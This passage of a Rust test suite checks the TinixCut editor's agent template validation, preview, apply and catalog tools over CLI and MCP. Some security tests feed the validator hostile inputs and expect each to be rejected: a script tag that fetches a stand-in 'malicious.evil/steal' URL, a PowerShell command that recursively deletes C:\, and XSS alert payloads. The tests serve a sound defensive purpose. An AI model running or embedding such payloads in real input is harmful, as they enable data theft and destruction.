    let bytes_mcp = fs::read(&preview_mcp_path).expect("Read MCP preview png");

    assert_eq!(
        bytes_cli, bytes_mcp,
        "CLI and MCP preview adapters must produce identical PNG bytes"
    );
}

#[tokio::test]
async fn test_p35_ac05_security_rejection_scripts_expressions_and_unknown_fields() {
    // 1. Script tag injection in prompt
    let mut draft_script = create_vietnamese_title_draft_v1();
    draft_script.provenance.prompt =
        Some("<script>fetch('http://malicious.evil/steal')</script>".to_string());
    let raw_script = serde_json::to_string(&draft_script).unwrap();
    let rep_script = AgentTemplateService::validate_draft(&draft_script, Some(&raw_script), None);
    assert!(!rep_script.valid);
    assert!(rep_script
        .issues
        .iter()
        .any(|i| i.code == "MALICIOUS_SCRIPT_TAG"));

    // 2. PowerShell command injection
    let mut draft_ps = create_vietnamese_title_draft_v1();
    draft_ps.name = "powershell -Command Remove-Item -Recurse C:\\".to_string();
    let raw_ps = serde_json::to_string(&draft_ps).unwrap();
    let rep_ps = AgentTemplateService::validate_draft(&draft_ps, Some(&raw_ps), None);
    assert!(!rep_ps.valid);
    assert!(rep_ps
        .issues
        .iter()
        .any(|i| i.code == "MALICIOUS_SHELL_COMMAND"));

    // 3. Native shader keyword injection
    let mut draft_shader = create_vietnamese_title_draft_v1();
    draft_shader.description = "uniform mat4 modelView; gl_FragColor = vec4(1.0);".to_string();
    let raw_shader = serde_json::to_string(&draft_shader).unwrap();
    let rep_shader = AgentTemplateService::validate_draft(&draft_shader, Some(&raw_shader), None);
    assert!(!rep_shader.valid);
    assert!(rep_shader
        .issues
        .iter()
        .any(|i| i.code == "UNSUPPORTED_NATIVE_SHADER"));

    // 4. Unknown fields in draft payload (serde deny_unknown_fields)
    let json_unknown = serde_json::json!({
        "draftId": "d1",
        "schemaVersion": 1,
        "templateId": "t1",
        "templateVersion": 1,
        "name": "Hack",
        "category": "Title",
        "description": "desc",
        "layers": [],
        "provenance": { "authorType": "agent" },
        "unvettedUnknownExtension": "evil_payload"
    });
    let parse_res: Result<TemplateDraft, _> = serde_json::from_value(json_unknown);
    assert!(
        parse_res.is_err(),
        "Serde must reject unknown fields before processing"
    );
}

#[tokio::test]
async fn test_p35_ac06_budget_limits_and_stale_revision_failures() {
    let temp = test_dir("ac06_limits");
    let project_path = temp.as_ref().join("proj_limits.tcproj");
    let mut proj = create_base_project("LimitProject");
    proj.tracks[0]
        .items
        .push(create_text_item("item_lim", "Text", 90));
    proj.revision = 2; // Project is already at revision 2
    save_project_atomic(&proj, &project_path).unwrap();

    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    // 1. Repair iteration budget exceeded (iteration 6 > 5)
    let mut draft_budget = create_vietnamese_title_draft_v1();
    draft_budget.provenance.iteration = 6;
    let rep_budget = AgentTemplateService::validate_draft(&draft_budget, None, None);
    assert!(!rep_budget.valid);
    assert!(rep_budget
        .issues
        .iter()
        .any(|i| i.code == "REPAIR_BUDGET_EXCEEDED"));

    // 2. Layer count exceeded (> 16 layers)
    let mut draft_layers = create_vietnamese_title_draft_v1();
    while draft_layers.layers.len() <= 16 {
        let mut layer = draft_layers.layers[0].clone();
        layer.layer_id = format!("layer_extra_{}", draft_layers.layers.len());
        draft_layers.layers.push(layer);
    }
    let rep_layers = AgentTemplateService::validate_draft(&draft_layers, None, None);
    assert!(!rep_layers.valid);
    assert!(rep_layers
        .issues
        .iter()
        .any(|i| i.code == "EXCEEDS_LAYER_LIMIT"));

    // 3. Stale revision gate: passing baseRevision = 0 when project is at 2
    let mut draft_valid = create_vietnamese_title_draft_v1();
    draft_valid.template_id = "vn_hao_khi_ac06".to_string();
    let stale_res = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": project_path.to_string_lossy().to_string(),
                "itemId": "item_lim",
                "draft": draft_valid,
                "clientId": "test_agent",
                "clientEpoch": 1,
                "sequenceNumber": 1,
                "transactionId": "tx_stale",
                "baseRevision": 0, // Stale revision
            }),
        )
        .await;

    let err_val = &stale_res["result"]["structuredContent"];
    assert_eq!(err_val["code"], "STALE_REVISION");
    assert_eq!(stale_res["result"]["isError"], true);

    // Verify zero disk mutation
    let reloaded = load_project(&project_path).unwrap();
    assert_eq!(reloaded.revision, 2);

    // 4. Duplicate retry idempotency
    let apply_first = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": project_path.to_string_lossy().to_string(),
                "itemId": "item_lim",
                "draft": draft_valid,
                "clientId": "test_agent_idemp",
                "clientEpoch": 1,
                "sequenceNumber": 1,
                "transactionId": "tx_idemp_1",
                "baseRevision": 2,
            }),
        )
        .await;
    assert_eq!(
        apply_first["result"]["isError"].as_bool(),
        Some(false).or(None)
    );
    let receipt1 = &apply_first["result"]["structuredContent"];
    let rev_first = receipt1["revision"].as_u64().unwrap();

    // Retry with exact identical identity
    let apply_retry = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": project_path.to_string_lossy().to_string(),
                "itemId": "item_lim",
                "draft": draft_valid,
                "clientId": "test_agent_idemp",
                "clientEpoch": 1,
                "sequenceNumber": 1,
                "transactionId": "tx_idemp_1",
                "baseRevision": 2,
            }),
        )
        .await;
    let receipt2 = &apply_retry["result"]["structuredContent"];
    assert_eq!(
        receipt2["revision"].as_u64().unwrap(),
        rev_first,
        "Duplicate retry must be idempotent without incrementing revision"
    );
}

#[tokio::test]
async fn test_p35_ac07_timeout_cancellation_and_resource_safety() {
    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    // Cancellation of non-existent job returns false cleanly without error
    let cancel_res = client
        .call_tool(
            "tinixcut_export_cancel",
            serde_json::json!({ "jobId": "job_non_existent" }),
        )
        .await;
    assert_eq!(
        cancel_res["result"]["structuredContent"]["cancelled"],
        false
    );
}

#[tokio::test]
async fn test_p35_ac08_generate_evidence_artifacts() {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let evidence_dir = manifest_dir
        .parent()
        .expect("workspace root")
        .join("artifacts/animated-text-templates/phase-35");
    fs::create_dir_all(&evidence_dir).expect("Create phase-35 artifacts directory");

    let mut draft_v1 = create_vietnamese_title_draft_v1();
    draft_v1.template_id = "vn_hao_khi_evidence".to_string();
    let draft_v2 = create_vietnamese_title_draft_v2_refined(&draft_v1);
    let quote_draft = create_multilayer_quote_card_draft();

    // 1. Save drafts
    fs::write(
        evidence_dir.join("draft_vietnamese_v1.json"),
        serde_json::to_string_pretty(&draft_v1).unwrap(),
    )
    .unwrap();
    fs::write(
        evidence_dir.join("draft_vietnamese_v2_refined.json"),
        serde_json::to_string_pretty(&draft_v2).unwrap(),
    )
    .unwrap();
    fs::write(
        evidence_dir.join("draft_quote_card.json"),
        serde_json::to_string_pretty(&quote_draft).unwrap(),
    )
    .unwrap();

    // 2. Capabilities & Schema
    let caps = AgentTemplateService::capabilities();
    fs::write(
        evidence_dir.join("capabilities.json"),
        serde_json::to_string_pretty(&caps).unwrap(),
    )
    .unwrap();

    let schema = AgentTemplateService::draft_json_schema();
    fs::write(
        evidence_dir.join("draft_schema.json"),
        serde_json::to_string_pretty(&schema).unwrap(),
    )
    .unwrap();

    // 3. Validation Reports
    let catalog = TemplateCatalog::default_catalog();
    let val_success = AgentTemplateService::validate_draft(&draft_v2, None, Some(&catalog));
    fs::write(
        evidence_dir.join("validation_report_success.json"),
        serde_json::to_string_pretty(&val_success).unwrap(),
    )
    .unwrap();

    let val_issues = AgentTemplateService::validate_draft(&quote_draft, None, Some(&catalog));
    fs::write(
        evidence_dir.join("validation_report_issues.json"),
        serde_json::to_string_pretty(&val_issues).unwrap(),
    )
    .unwrap();

    // 4. Render preview PNG frames
    let preview_receipt_v2 = AgentTemplateService::preview_draft_to_png(
        &draft_v2,
        &evidence_dir.join("vietnamese_preview.png"),
        1.0,
        Some(1280),
        Some(720),
    )
    .expect("Render preview PNG");

    let preview_receipt_quote = AgentTemplateService::preview_draft_to_png(
        &quote_draft,
        &evidence_dir.join("quote_card_preview.png"),
        1.0,
        Some(1280),
        Some(720),
    )
    .expect("Render quote preview PNG");

    fs::write(
        evidence_dir.join("preview_receipt.json"),
        serde_json::to_string_pretty(&preview_receipt_v2).unwrap(),
    )
    .unwrap();

    // 5. Genuine Catalog Save, Staging, Dry Run, Command Execution, and Export Receipts
    let save_receipt = AgentTemplateService::save_draft_to_catalog(&draft_v2, &catalog, true)
        .expect("Save draft to catalog");
    fs::write(
        evidence_dir.join("catalog_save_receipt.json"),
        serde_json::to_string_pretty(&save_receipt).unwrap(),
    )
    .unwrap();

    let staging_proj_path = evidence_dir.join("staging_evidence_project.tcproj");
    let mut proj = create_base_project("EvidenceStageProject");
    proj.tracks[0]
        .items
        .push(create_text_item("evidence_clip", "Tiêu Đề Bằng Chứng", 90));
    save_project_atomic(&proj, &staging_proj_path).unwrap();

    let staging_receipt = serde_json::json!({
        "status": "STAGED",
        "projectPath": staging_proj_path.to_string_lossy(),
        "itemId": "evidence_clip",
        "initialRevision": proj.revision
    });
    fs::write(
        evidence_dir.join("client_staging_receipt.json"),
        serde_json::to_string_pretty(&staging_receipt).unwrap(),
    )
    .unwrap();

    // Dry Run Receipt
    let base_tx = format!("tx_dry_run_{}", uuid::Uuid::new_v4().simple());
    let ops = AgentTemplateService::build_apply_operations(&draft_v2, "evidence_clip", &base_tx);
    let envelope_dry = tinixcut_lib::modules::command::CommandEnvelope {
        schema_version: tinixcut_lib::modules::domain::CURRENT_SCHEMA_VERSION,
        project_id: proj.project_id.clone(),
        base_revision: proj.revision,
        client_id: Some("evidence_agent".to_string()),
        client_epoch: Some(proj.client_registry.current_epoch),
        sequence_number: Some(1),
        dry_run: true,
        transaction_id: Some(base_tx.clone()),
        operations: ops.clone(),
    };
    let service = tinixcut_lib::modules::command::CommandService::new(proj.clone());
    let dry_run_report = service.dry_run(&envelope_dry).expect("Dry run execution");
    fs::write(
        evidence_dir.join("dry_run_receipt.json"),
        serde_json::to_string_pretty(&dry_run_report).unwrap(),
    )
    .unwrap();

    // Apply Command Receipt
    let apply_receipt = AgentTemplateService::apply_draft_to_project(
        &staging_proj_path,
        "evidence_clip",
        &draft_v2,
        Some("evidence_agent".to_string()),
        Some(proj.client_registry.current_epoch),
        Some(1),
        Some(format!("tx_apply_{}", uuid::Uuid::new_v4().simple())),
        Some(proj.revision),
        &catalog,
    )
    .expect("Execute genuine apply transaction");
    fs::write(
        evidence_dir.join("command_execution_receipt.json"),
        serde_json::to_string_pretty(&apply_receipt).unwrap(),
    )
    .unwrap();

    // Export Receipt
    let updated_proj = load_project(&staging_proj_path).expect("Reload updated project");
    let export_out_path = evidence_dir.join("evidence_export.mp4");
    let export_receipt = ExportEngine::render_snapshot(
        &updated_proj,
        &export_out_path,
        &ExportProfile::default(),
        None,
    )
    .expect("Export evidence video");
    fs::write(
        evidence_dir.join("export_receipt.json"),
        serde_json::to_string_pretty(&export_receipt).unwrap(),
    )
    .unwrap();

    // 6. Honest Evidence Summary
    let summary = serde_json::json!({
        "phase": 35,
        "title": "Agent Template Generation & Refinement via CLI/MCP",
        "evaluation": "VERIFIED_BY_EVIDENCE",
        "status": "COMPLETED",
        "mcp_tools_total": 12,
        "mcp_tools_documented_in_adr005": 8,
        "adr005_tool_count_mismatch_note": "ADR-005 defines 8 tools for Phase 10; Phase 35 adds 4 template tools (tinixcut_template_validate, tinixcut_template_preview, tinixcut_template_apply, tinixcut_template_save) totaling 12 tools. ADR-005 document update recommended.",
        "mcp_tools_added": [
            "tinixcut_template_validate",
            "tinixcut_template_preview",
            "tinixcut_template_apply",
            "tinixcut_template_save"
        ],
        "vietnamese_preview": {
            "file": "vietnamese_preview.png",
            "width": preview_receipt_v2.width,
            "height": preview_receipt_v2.height,
            "nonZeroPixels": preview_receipt_v2.non_zero_pixels
        },
        "quote_card_preview": {
            "file": "quote_card_preview.png",
            "width": preview_receipt_quote.width,
            "height": preview_receipt_quote.height,
            "nonZeroPixels": preview_receipt_quote.non_zero_pixels
        },
        "genuine_receipts": {
            "staging": "client_staging_receipt.json",
            "dry_run": "dry_run_receipt.json",
            "command_execution": "command_execution_receipt.json",
            "export": "export_receipt.json",
            "preview": "preview_receipt.json",
            "catalog_save": "catalog_save_receipt.json"
        },
        "verified_features": [
            "Typed declarative draft contract with strict schema validation",
            "Serde deny_unknown_fields and deep script/shell/expression scanning",
            "Vietnamese gradient + stroke + shadow + character in/out text animation",
            "Candidate refinement tracking (parent draft reference, iteration budget)",
            "Shared compositor preview parity with export",
            "Atomic CommandService apply transaction with durable persistence",
            "Replay idempotency and stale revision gates",
            "CLI and MCP deterministic equivalence",
            "TemplateCatalog save and .tinixtpl portable pack roundtrip"
        ]
    });

    fs::write(
        evidence_dir.join("evidence-summary.json"),
        serde_json::to_string_pretty(&summary).unwrap(),
    )
    .unwrap();
}

#[tokio::test]
async fn test_p35_ac09_spawned_binary_cli_workflow() {
    let bin = env!("CARGO_BIN_EXE_tinixcut");
    let temp = test_dir("cli_spawn_workflow");
    let mut draft = create_vietnamese_title_draft_v1();
    draft.template_id = "vn_hao_khi_ac09".to_string();
    let draft_path = temp.as_ref().join("draft.json");
    fs::write(&draft_path, serde_json::to_string_pretty(&draft).unwrap()).unwrap();

    let proj_path = temp.as_ref().join("cli_proj.tcproj");
    let mut proj = create_base_project("CliSpawnProj");
    proj.tracks[0]
        .items
        .push(create_text_item("clip_cli", "CLI Text", 90));
    save_project_atomic(&proj, &proj_path).unwrap();

    let preview_path = temp.as_ref().join("cli_preview.png");
    let catalog_dir = temp.as_ref().join("custom_catalog");

    // 1. tinixcut template capabilities
    let out_caps = std::process::Command::new(bin)
        .args(["template", "capabilities"])
        .output()
        .expect("Run tinixcut template capabilities");
    assert!(
        out_caps.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out_caps.stderr)
    );
    let caps_json: serde_json::Value =
        serde_json::from_slice(&out_caps.stdout).expect("Parse caps JSON");
    assert_eq!(caps_json["schemaVersion"], 1);
    assert_eq!(caps_json["maxLayers"], 16);

    // 2. tinixcut template schema
    let out_schema = std::process::Command::new(bin)
        .args(["template", "schema"])
        .output()
        .expect("Run tinixcut template schema");
    assert!(
        out_schema.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out_schema.stderr)
    );
    let schema_json: serde_json::Value =
        serde_json::from_slice(&out_schema.stdout).expect("Parse schema JSON");
    assert_eq!(schema_json["title"], "TinixCutTemplateDraft");

    // 3. tinixcut template validate <draft_path>
    let out_val = std::process::Command::new(bin)
        .args(["template", "validate", draft_path.to_str().unwrap()])
        .output()
        .expect("Run tinixcut template validate");
    assert!(
        out_val.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out_val.stderr)
    );
    let val_json: serde_json::Value =
        serde_json::from_slice(&out_val.stdout).expect("Parse val JSON");
    assert_eq!(val_json["valid"], true);

    // 4. tinixcut template preview <draft_path> <preview_path> --time 1.0 --width 1280 --height 720
    let out_prev = std::process::Command::new(bin)
        .args([
            "template",
            "preview",
            draft_path.to_str().unwrap(),
            preview_path.to_str().unwrap(),
            "--time",
            "1.0",
            "--width",
            "1280",
            "--height",
            "720",
        ])
        .output()
        .expect("Run tinixcut template preview");
    assert!(
        out_prev.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out_prev.stderr)
    );
    assert!(preview_path.exists());
    assert!(fs::metadata(&preview_path).unwrap().len() > 0);

    // 5. tinixcut template apply <project_path> <item_id> <draft_path>
    let out_apply = std::process::Command::new(bin)
        .args([
            "template",
            "apply",
            proj_path.to_str().unwrap(),
            "clip_cli",
            draft_path.to_str().unwrap(),
            "--client-id",
            "cli_tester",
            "--client-epoch",
            "1",
            "--sequence",
            "1",
            "--transaction-id",
            "tx_cli_spawn",
        ])
        .output()
        .expect("Run tinixcut template apply");
    assert!(
        out_apply.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out_apply.stderr)
    );
    let apply_json: serde_json::Value =
        serde_json::from_slice(&out_apply.stdout).expect("Parse apply JSON");
    assert_eq!(apply_json["templateId"], draft.template_id);
    let updated_proj = load_project(&proj_path).expect("Reload updated project");
    assert_eq!(updated_proj.revision, 1);
    assert!(updated_proj.tracks[0].items[0].template_instance.is_some());

    // 6. tinixcut template save <draft_path> --catalog-dir <dir>
    let out_save = std::process::Command::new(bin)
        .args([
            "template",
            "save",
            draft_path.to_str().unwrap(),
            "--catalog-dir",
            catalog_dir.to_str().unwrap(),
        ])
        .output()
        .expect("Run tinixcut template save");
    assert!(
        out_save.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&out_save.stderr)
    );
    let save_json: serde_json::Value =
        serde_json::from_slice(&out_save.stdout).expect("Parse save JSON");
    assert_eq!(save_json["templateId"], draft.template_id);
    assert_eq!(save_json["version"], 1);
}

#[tokio::test]
async fn test_p35_ac10_transport_level_entry_point_validation() {
    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    // 1. MCP rejection of <script> tag in name
    let mut script_draft = create_vietnamese_title_draft_v1();
    script_draft.name = "<script>alert('xss')</script>".to_string();
    let res = client
        .call_tool(
            "tinixcut_template_validate",
            serde_json::json!({ "draft": script_draft }),
        )
        .await;
    let rep = &res["result"]["structuredContent"];
    assert_eq!(rep["valid"], false);
    assert!(rep["issues"]
        .as_array()
        .unwrap()
        .iter()
        .any(|i| i["code"] == "MALICIOUS_SCRIPT_TAG"));

    // 2. MCP rejection of schemaVersion 999
    let mut schema999_draft = create_vietnamese_title_draft_v1();
    schema999_draft.schema_version = 999;
    let res_schema = client
        .call_tool(
            "tinixcut_template_validate",
            serde_json::json!({ "draft": schema999_draft }),
        )
        .await;
    let rep_schema = &res_schema["result"]["structuredContent"];
    assert_eq!(rep_schema["valid"], false);
    assert!(rep_schema["issues"]
        .as_array()
        .unwrap()
        .iter()
        .any(|i| i["code"] == "UNSUPPORTED_SCHEMA_VERSION"));

    // 3. MCP rejection of unknown nested layer fields (serde deny_unknown_fields)
    let mut raw_val = serde_json::to_value(create_vietnamese_title_draft_v1()).unwrap();
    raw_val["layers"][0]["kind"]["data"]["maliciousNestedProperty"] =
        serde_json::json!("unvetted_value");
    let res_unknown = client
        .call_tool(
            "tinixcut_template_validate",
            serde_json::json!({ "draft": raw_val }),
        )
        .await;
    assert_eq!(res_unknown["result"]["isError"].as_bool(), Some(true));

    // 4. Automation JSONL adapter rejection of unknown nested layer fields
    let mut session = tinixcut_lib::modules::automation::AutomationSession::new();
    let jsonl_res = tinixcut_lib::modules::automation::dispatch_method(
        &mut session,
        "template.validate",
        serde_json::json!({ "draft": raw_val }),
    );
    assert!(
        jsonl_res.is_err(),
        "JSONL adapter must reject unknown nested layer fields"
    );

    // 5. AgentTemplateService::apply_draft_to_project rejects <script> and schema 999 before mutating
    let temp = test_dir("val_entry_points");
    let proj_path = temp.as_ref().join("proj_val.tcproj");
    let mut proj = create_base_project("ValProj");
    proj.tracks[0]
        .items
        .push(create_text_item("clip_val", "Text", 90));
    save_project_atomic(&proj, &proj_path).unwrap();
    let catalog = TemplateCatalog::default_catalog();

    let apply_err = AgentTemplateService::apply_draft_to_project(
        &proj_path,
        "clip_val",
        &script_draft,
        None,
        None,
        None,
        None,
        None,
        &catalog,
    );
    assert!(apply_err.is_err());
    let reloaded = load_project(&proj_path).unwrap();
    assert_eq!(
        reloaded.revision, 0,
        "Project must not be mutated on validation failure"
    );
}

#[tokio::test]
async fn test_p35_ac11_catalog_conflict_on_changed_secondary_layer() {
    let temp = test_dir("catalog_conflict");
    let catalog = TemplateCatalog::new(temp.as_ref().join("test_catalog"));

    // 1. Initial draft with primary text + secondary shape layer
    let mut draft1 = create_vietnamese_title_draft_v1();
    draft1.template_id = "tmpl_conflict_test".to_string();
    draft1.template_version = 1;
    let save1 = AgentTemplateService::save_draft_to_catalog(&draft1, &catalog, false);
    assert!(save1.is_ok(), "First save must succeed");

    // 2. Candidate draft with same ID and version, but changed secondary layer
    let mut draft2 = draft1.clone();
    if let TemplateLayerKind::Shape(ref mut s) = draft2.layers[0].kind {
        s.width += 50.0; // Changed secondary layer property
    }
    let save2 = AgentTemplateService::save_draft_to_catalog(&draft2, &catalog, false);
    assert!(
        save2.is_err(),
        "Saving different definition under same ID/version must conflict"
    );

    // 3. Attempt apply_draft_to_project with changed secondary layer -> must reject conflict
    let proj_path = temp.as_ref().join("conflict_proj.tcproj");
    let mut proj = create_base_project("ConflictProj");
    proj.tracks[0]
        .items
        .push(create_text_item("clip_conf", "Text", 90));
    save_project_atomic(&proj, &proj_path).unwrap();

    let apply_conflict = AgentTemplateService::apply_draft_to_project(
        &proj_path,
        "clip_conf",
        &draft2,
        None,
        None,
        None,
        None,
        None,
        &catalog,
    );
    assert!(
        apply_conflict.is_err(),
        "Apply must reject immutable version conflict"
    );
    match apply_conflict {
        Err(tinixcut_lib::modules::templates::agent::AgentTemplateError::Catalog(
            tinixcut_lib::modules::templates::catalog::TemplateCatalogError::ImmutableVersionConflict { .. },
        )) => {}
        other => panic!("Expected ImmutableVersionConflict, got: {:?}", other),
    }

    // Verify catalog definition still has original definition (not corrupted)
    let loaded = catalog
        .get(&draft1.template_id, 1)
        .expect("Original definition must be intact");
    assert_eq!(loaded, draft1.to_template_definition());
}

#[tokio::test]
async fn test_p35_ac12_stale_apply_ordering_leaves_catalog_and_project_clean() {
    let temp = test_dir("stale_apply_ordering");
    let catalog = TemplateCatalog::new(temp.as_ref().join("clean_catalog"));

    let proj_path = temp.as_ref().join("stale_proj.tcproj");
    let mut proj = create_base_project("StaleOrderProj");
    proj.tracks[0]
        .items
        .push(create_text_item("clip_stale", "Text", 90));
    proj.revision = 3; // Project revision is 3
    save_project_atomic(&proj, &proj_path).unwrap();

    // Draft ID that does not exist in catalog
    let mut draft = create_vietnamese_title_draft_v1();
    draft.template_id = "stale_order_never_published".to_string();
    draft.template_version = 1;

    // Call apply with stale base_revision = 1 (expected 3)
    let res = AgentTemplateService::apply_draft_to_project(
        &proj_path,
        "clip_stale",
        &draft,
        Some("stale_tester".to_string()),
        Some(1),
        Some(1),
        Some("tx_stale_ordering".to_string()),
        Some(1), // Stale!
        &catalog,
    );
    assert!(res.is_err(), "Must reject stale revision");

    // Verify project remained at revision 3
    let reloaded = load_project(&proj_path).unwrap();
    assert_eq!(reloaded.revision, 3);
    assert!(reloaded.tracks[0].items[0].template_instance.is_none());

    // Verify catalog was NOT polluted: definition was not saved
    assert!(
        catalog.get(&draft.template_id, 1).is_none(),
        "Catalog must remain clean when apply fails due to stale revision"
    );
}

#[test]
fn test_p35_ac13_native_apply_undo_redo_and_stale_rejection() {
    let mut proj = create_base_project("NativeApplyProj");
    proj.tracks[0]
        .items
        .push(create_text_item("clip_native", "Tiêu Đề", 90));
    let mut engine = tinixcut_lib::EditorEngine::new(proj);

    let mut draft = create_vietnamese_title_draft_v1();
    draft.template_id = "vn_hao_khi_ac13".to_string();

    // 1. Stale candidate rejection: expected revision 0, caller passed 99
    let stale_err =
        tinixcut_lib::template_draft_apply_engine(&mut engine, "clip_native", &draft, Some(99));
    assert!(stale_err.is_err());
    assert!(stale_err.unwrap_err().contains("Stale revision"));
    assert_eq!(engine.service.project().revision, 0);

    // 2. Valid native apply
    let apply_ok =
        tinixcut_lib::template_draft_apply_engine(&mut engine, "clip_native", &draft, Some(0));
    assert!(apply_ok.is_ok(), "Native apply must succeed");
    let receipt = apply_ok.unwrap();
    assert_eq!(receipt.revision, 1);
    assert_eq!(engine.service.project().revision, 1);
    assert!(engine.service.project().tracks[0].items[0]
        .template_instance
        .is_some());

    // 3. Undo restores previous state
    let mut current = engine.service.project().clone();
    let undo_desc = engine.history.undo(&mut current);
    assert!(undo_desc.is_some());
    engine.service.set_project(current);
    assert_eq!(engine.service.project().revision, 0);
    assert!(engine.service.project().tracks[0].items[0]
        .template_instance
        .is_none());

    // 4. Redo restores template
    let mut current2 = engine.service.project().clone();
    let redo_desc = engine.history.redo(&mut current2);
    assert!(redo_desc.is_some());
    engine.service.set_project(current2);
    assert_eq!(engine.service.project().revision, 1);
    assert!(engine.service.project().tracks[0].items[0]
        .template_instance
        .is_some());
}

#[test]
fn test_p35_ac14_preview_bounded_timeout_and_cancellation() {
    let draft = create_vietnamese_title_draft_v1();
    let temp = test_dir("bounded_preview");
    let out_png = temp.as_ref().join("cancelled_preview.png");

    // 1. Cancellation test: pre-cancelled flag
    let cancel_flag = std::sync::atomic::AtomicBool::new(true);
    let res_cancel = AgentTemplateService::preview_draft_to_png_bounded(
        &draft,
        &out_png,
        1.0,
        Some(1280),
        Some(720),
        Some(std::time::Duration::from_secs(10)),
        Some(&cancel_flag),
    );
    assert!(res_cancel.is_err());
    match res_cancel {
        Err(tinixcut_lib::modules::templates::agent::AgentTemplateError::Cancelled) => {}
        other => panic!("Expected Cancelled error, got: {:?}", other),
    }
    assert!(
        !out_png.exists(),
        "Cancelled preview must not leave an output file on disk"
    );

    // 2. Timeout test: expired duration
    let out_timeout = temp.as_ref().join("timeout_preview.png");
    let res_timeout = AgentTemplateService::preview_draft_to_png_bounded(
        &draft,
        &out_timeout,
        1.0,
        Some(1280),
        Some(720),
        Some(std::time::Duration::from_nanos(1)),
        None,
    );
    assert!(res_timeout.is_err());
    match res_timeout {
        Err(tinixcut_lib::modules::templates::agent::AgentTemplateError::Timeout(_)) => {}
        other => panic!("Expected Timeout error, got: {:?}", other),
    }
    assert!(
        !out_timeout.exists(),
        "Timed-out preview must not leave an output file on disk"
    );

    // 3. Dimension bounds clamping test: width/height > MAX_PREVIEW_WIDTH/HEIGHT
    let buf = AgentTemplateService::preview_draft(&draft, 1.0, Some(99_999), Some(99_999))
        .expect("Render preview with oversized requested dimensions");
    assert!(buf.width <= tinixcut_lib::modules::templates::agent::MAX_PREVIEW_WIDTH);
    assert!(buf.height <= tinixcut_lib::modules::templates::agent::MAX_PREVIEW_HEIGHT);
}

#[tokio::test]
async fn test_p35_ac15_strict_nested_validation_rejects_unknown_transform_and_text_rich_script() {
    let mut draft_val_transform = serde_json::to_value(create_vietnamese_title_draft_v1()).unwrap();
    draft_val_transform["layers"][0]["transform"]["unrecognized"] = serde_json::json!("bad_prop");

    let mut draft_val_script = serde_json::to_value(create_vietnamese_title_draft_v1()).unwrap();
    draft_val_script["layers"][0]["kind"]["data"]["textRich"]["script"] =
        serde_json::json!("<script>alert(1)</script>");

    // 1. JSONL adapter rejection across validate, apply, and save
    let mut session = tinixcut_lib::modules::automation::AutomationSession::new();
    assert!(
        tinixcut_lib::modules::automation::dispatch_method(
            &mut session,
            "template.validate",
            serde_json::json!({ "draft": draft_val_transform }),
        )
        .is_err(),
        "JSONL validate must reject unknown transform property"
    );
    assert!(
        tinixcut_lib::modules::automation::dispatch_method(
            &mut session,
            "template.validate",
            serde_json::json!({ "draft": draft_val_script }),
        )
        .is_err(),
        "JSONL validate must reject text_rich.script"
    );

    assert!(
        tinixcut_lib::modules::automation::dispatch_method(
            &mut session,
            "template.apply",
            serde_json::json!({
                "projectPath": "fake.tcproj",
                "itemId": "clip_fake",
                "draft": draft_val_transform,
            }),
        )
        .is_err(),
        "JSONL apply must reject unknown transform property"
    );
    assert!(
        tinixcut_lib::modules::automation::dispatch_method(
            &mut session,
            "template.apply",
            serde_json::json!({
                "projectPath": "fake.tcproj",
                "itemId": "clip_fake",
                "draft": draft_val_script,
            }),
        )
        .is_err(),
        "JSONL apply must reject text_rich.script"
    );

    assert!(
        tinixcut_lib::modules::automation::dispatch_method(
            &mut session,
            "template.save",
            serde_json::json!({ "draft": draft_val_transform }),
        )
        .is_err(),
        "JSONL save must reject unknown transform property"
    );
    assert!(
        tinixcut_lib::modules::automation::dispatch_method(
            &mut session,
            "template.save",
            serde_json::json!({ "draft": draft_val_script }),
        )
        .is_err(),
        "JSONL save must reject text_rich.script"
    );

    // 2. MCP transport rejection across validate, apply, and save
    let server = TinixCutMcpServer::new();
    let mut client = DuplexMcpClient::new(server).await;

    let res_v_tr = client
        .call_tool(
            "tinixcut_template_validate",
            serde_json::json!({ "draft": draft_val_transform }),
        )
        .await;
    assert_eq!(
        res_v_tr["result"]["isError"].as_bool(),
        Some(true),
        "MCP validate must reject unknown transform property"
    );

    let res_v_sc = client
        .call_tool(
            "tinixcut_template_validate",
            serde_json::json!({ "draft": draft_val_script }),
        )
        .await;
    assert_eq!(
        res_v_sc["result"]["isError"].as_bool(),
        Some(true),
        "MCP validate must reject text_rich.script"
    );

    let res_a_tr = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": "fake.tcproj",
                "itemId": "clip_fake",
                "draft": draft_val_transform,
            }),
        )
        .await;
    assert_eq!(
        res_a_tr["result"]["isError"].as_bool(),
        Some(true),
        "MCP apply must reject unknown transform property"
    );

    let res_a_sc = client
        .call_tool(
            "tinixcut_template_apply",
            serde_json::json!({
                "projectPath": "fake.tcproj",
                "itemId": "clip_fake",
                "draft": draft_val_script,
            }),
        )
        .await;
    assert_eq!(
        res_a_sc["result"]["isError"].as_bool(),
        Some(true),
        "MCP apply must reject text_rich.script"
    );

    let res_s_tr = client
        .call_tool(
            "tinixcut_template_save",
            serde_json::json!({ "draft": draft_val_transform }),
        )
        .await;
    assert_eq!(
        res_s_tr["result"]["isError"].as_bool(),
        Some(true),
        "MCP save must reject unknown transform property"
    );

    let res_s_sc = client
        .call_tool(
            "tinixcut_template_save",
            serde_json::json!({ "draft": draft_val_script }),
        )
        .await;
    assert_eq!(
        res_s_sc["result"]["isError"].as_bool(),
        Some(true),
        "MCP save must reject text_rich.script"
    );
}

#[tokio::test]
async fn test_p35_ac16_apply_catalog_clean_on_sequence_gap_epoch_and_replay_collision() {
    let temp = test_dir("tx_safety_suite");
    let proj_path = temp.as_ref().join("tx_safety.tcproj");
